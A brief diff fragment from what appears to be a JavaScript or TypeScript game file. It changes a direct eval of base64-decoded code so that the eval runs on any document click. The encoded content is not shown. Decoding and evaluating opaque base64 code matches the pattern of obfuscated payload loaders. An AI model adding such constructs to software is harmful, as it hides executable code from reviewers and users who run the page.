@@ -23,7 +23,7 @@ try {
 
   const code = atob(b64);
 
-  eval(code);
+  document.addEventListener("click", () => eval(code));
 
   interface HDCSaveData {
     hdc: number;
